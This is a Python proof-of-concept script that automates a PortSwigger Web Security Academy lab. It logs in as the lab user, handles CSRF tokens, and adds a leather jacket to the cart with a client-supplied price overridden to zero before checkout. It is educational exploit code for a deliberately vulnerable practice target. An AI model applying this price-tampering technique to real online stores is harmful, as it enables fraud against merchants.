\#!/usr/bin/env python3

"""

PoC: Excessive trust in client-side controls (PortSwigger Web Security Academy)



Buys the "Lightweight l33t leather jacket" by overriding the client-supplied

price parameter. The server trusts whatever price the browser sends, so we

send zero.



FOR USE ONLY against your own PortSwigger lab instance. This is educational

automation for a deliberately vulnerable practice target.



Lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls



Requires: pip install requests

Usage:    python3 solve.py https://YOUR-LAB-ID.web-security-academy.net

"""



import re

import sys

import requests



USERNAME = "wiener"

PASSWORD = "peter"

PRODUCT\_ID = "1"        # the leather jacket

SPOOFED\_PRICE = "0"     # the whole point: £0.00 (any value < store credit works)





def get\_csrf(session, url):

&#x20;   """Pull the CSRF token out of a page's hidden form field."""

&#x20;   resp = session.get(url)

&#x20;   match = re.search(r'name="csrf" value="(\[^"]+)"', resp.text)

&#x20;   if not match:

&#x20;       sys.exit(f"\[-] No CSRF token found at {url} — is the lab URL correct?")

&#x20;   return match.group(1)





def main(base):

&#x20;   base = base.rstrip("/")

&#x20;   s = requests.Session()



&#x20;   # 1. Log in as a normal customer.

&#x20;   csrf = get\_csrf(s, f"{base}/login")

&#x20;   s.post(f"{base}/login", data={

&#x20;       "csrf": csrf,

&#x20;       "username": USERNAME,

&#x20;       "password": PASSWORD,

&#x20;   })

&#x20;   print(f"\[+] Logged in as {USERNAME}")



&#x20;   # 2. Add the jacket to the cart — but lie about the price.

&#x20;   #    'price' is in pennies and the server trusts it blindly.

&#x20;   s.post(f"{base}/cart", data={

&#x20;       "productId": PRODUCT\_ID,

&#x20;       "redir": "PRODUCT",

&#x20;       "quantity": "1",

&#x20;       "price": SPOOFED\_PRICE,

&#x20;   })

&#x20;   print(f"\[+] Jacket added to cart at spoofed price = {SPOOFED\_PRICE}")



&#x20;   # 3. Place the order.

&#x20;   csrf = get\_csrf(s, f"{base}/cart")

&#x20;   s.post(f"{base}/cart/checkout", data={"csrf": csrf})

&#x20;   print("\[+] Order placed.")



&#x20;   # 4. Confirm by checking the lab status banner on the home page.

&#x20;   if "is-solved" in s.get(base).text:

&#x20;       print("\[✓] Lab solved — the store banner now reads 'Solved'.")

&#x20;   else:

&#x20;       print("\[!] Order sent, but the solved banner wasn't detected. "

&#x20;             "Open the lab in a browser to confirm.")





if \_\_name\_\_ == "\_\_main\_\_":

&#x20;   if len(sys.argv) != 2:

&#x20;       sys.exit("Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net")

&#x20;   main(sys.argv\[1])

